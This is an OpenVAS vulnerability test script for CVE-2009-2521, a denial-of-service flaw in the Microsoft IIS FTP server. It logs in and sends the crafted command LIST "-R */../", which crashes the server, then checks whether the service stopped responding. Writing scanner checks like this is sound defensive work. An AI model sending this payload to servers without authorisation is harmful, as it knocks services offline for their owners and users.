###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ms_iis_ftpd_ls_dos_vuln.nasl 13610 2019-02-12 15:17:00Z cfischer $
#
# Microsoft IIS FTP Server 'ls' Command DOS Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:microsoft:ftp_service";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900944");
  script_version("$Revision: 13610 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 16:17:00 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2009-09-18 08:01:03 +0200 (Fri, 18 Sep 2009)");
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2009-2521");
  script_bugtraq_id(36273);
  script_name("Microsoft IIS FTP Server 'ls' Command DOS Vulnerability");
  script_xref(name:"URL", value:"http://www.microsoft.com/technet/security/advisory/975191.mspx");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0040.html");
  script_xref(name:"URL", value:"http://blogs.technet.com/msrc/archive/2009/09/01/microsoft-security-advisory-975191-released.aspx");
  script_xref(name:"URL", value:"http://blogs.technet.com/msrc/archive/2009/09/03/microsoft-security-advisory-975191-revised.aspx");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Denial of Service");
  script_dependencies("secpod_ms_iis_ftpd_detect.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("MS/IIS-FTP/Installed");

  script_tag(name:"impact", value:"Successful exploitation will allows remote authenticated users to crash the
  application leading to denial of service condition.");

  script_tag(name:"affected", value:"Microsoft Internet Information Services version 5.0 and 6.0");

  script_tag(name:"insight", value:"A stack consumption error occurs in the FTP server while processing crafted
  LIST command containing a wildcard that references a subdirectory followed by
  a .. (dot dot).");

  script_tag(name:"solution", value:"Upgrade to IIS version 7.5");

  script_tag(name:"summary", value:"The host is running Microsoft IIS with FTP server and
  is prone to Denial of Service vulnerability.");

  script_tag(name:"qod_type", value:"registry");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

if(!ftpPort = get_app_port(cpe:CPE, service:"ftp"))
  exit(0);

if(!get_app_location(port:ftpPort, cpe:CPE))
  exit(0);

soc = open_sock_tcp(ftpPort);
if(!soc)
  exit(0);

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
pass = kb_creds["pass"];

if(ftp_authenticate(socket:soc, user:login, pass:pass)) {

  cmd = 'LIST "-R */../"\r\n'; # The IIS server crashes and restarted.
  send(socket:soc, data:cmd);
  sleep(10);
  buff = recv(socket:soc, length:1024);

  ecmd = 'LIST\r\n';
  send(socket:soc, data:ecmd);
  eresp = recv(socket:soc, length:1024);
  if("Can't open data connection" >< eresp){
    security_message(port:ftpPort);
  }
}

close(soc);